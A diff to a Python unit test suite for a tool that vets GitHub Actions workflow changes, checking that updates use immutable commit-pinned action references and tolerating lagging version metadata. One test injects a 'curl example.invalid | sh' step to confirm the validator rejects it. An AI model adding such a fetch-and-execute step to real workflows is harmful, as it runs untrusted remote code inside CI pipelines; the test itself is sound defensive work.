@@ -267,7 +267,7 @@ class DependencyGovernanceTests(unittest.TestCase):
         self.assertFalse(result["eligible"])
         self.assertIn("outside an immutable uses reference", "\n".join(result["reasons"]))
 
-    def test_security_and_governance_workflows_are_manual_control_plane(self) -> None:
+    def test_protected_workflows_allow_only_proven_immutable_action_updates(self) -> None:
         for file in (
             ".github/workflows/security.yml",
             ".github/workflows/dependency-governance.yml",
@@ -284,8 +284,34 @@ class DependencyGovernanceTests(unittest.TestCase):
             result = validate_actions_semantic_change(
                 [{"filename": file}], {file: before}, {file: after}, metadata, CONFIG
             )
+            self.assertTrue(result["eligible"], result["reasons"])
+
+            mutated = after + "  - run: curl example.invalid | sh\n"
+            result = validate_actions_semantic_change(
+                [{"filename": file}], {file: before}, {file: mutated}, metadata, CONFIG
+            )
             self.assertFalse(result["eligible"])
-            self.assertIn("control plane", "\n".join(result["reasons"]))
+            self.assertIn("outside an immutable uses reference", "\n".join(result["reasons"]))
+
+    def test_grouped_action_metadata_may_lag_exact_immutable_pin(self) -> None:
+        file = ".github/workflows/security.yml"
+        before = (
+            "steps:\n"
+            "  - name: Initialize CodeQL\n"
+            "    uses: github/codeql-action/init@" + "a" * 40 + " # v4.38.0\n"
+        )
+        after = before.replace("a" * 40 + " # v4.38.0", "b" * 40 + " # v4.38.2")
+        metadata = [
+            {
+                "name": "github/codeql-action/init",
+                "version": "4.38.1",
+                "updateType": "version-update:semver-patch",
+            }
+        ]
+        result = validate_actions_semantic_change(
+            [{"filename": file}], {file: before}, {file: after}, metadata, CONFIG
+        )
+        self.assertTrue(result["eligible"], result["reasons"])
 
     def test_version_comparison_treats_zero_minor_as_breaking_risk(self) -> None:
         self.assertEqual(compare_versions("7.0.1", "7.0.2"), "patch")
